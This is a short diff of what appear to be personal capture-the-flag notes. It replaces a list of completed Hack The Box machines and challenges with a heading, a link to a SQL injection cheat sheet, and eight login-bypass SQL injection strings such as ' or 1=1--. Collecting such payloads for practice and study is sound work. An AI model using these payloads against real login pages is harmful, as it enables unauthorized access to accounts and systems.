@@ -1,25 +1,12 @@
-# Machines done
+# sql injection queries
+https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+for login pages
 
-paper
-lame
-cap
-
-# challenges done
-
-osint - 
-    Monstrosity
-    Easy phish
-    Infiltration
-    Missing in action
-    
-reversing - 
-    behind the scenes
-    bypass
-
-web -
-    phonebook 
-    blinker fluids
-    templated htb
-
-misc -
-    canvas
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
